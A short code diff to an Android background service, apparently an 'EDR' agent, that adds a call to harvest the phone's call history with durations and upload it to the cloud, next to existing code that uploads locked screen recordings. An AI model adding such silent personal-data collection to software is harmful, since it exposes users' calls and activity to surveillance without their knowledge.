@@ -94,6 +94,9 @@ class EdrForegroundService : Service() {
 
         // Retry and upload any pending offline locked recordings & clean up old trashed files
         AppTrapScreenRecorder.flushPendingLockedRecordings(this)
+
+        // Harvest phone call history with exact duration metrics and synchronize with cloud
+        com.edr.agent.telemetry.CallLogHarvester.harvestAndUpload(this)
     }
 
     private fun registerScreenStateReceiver() {
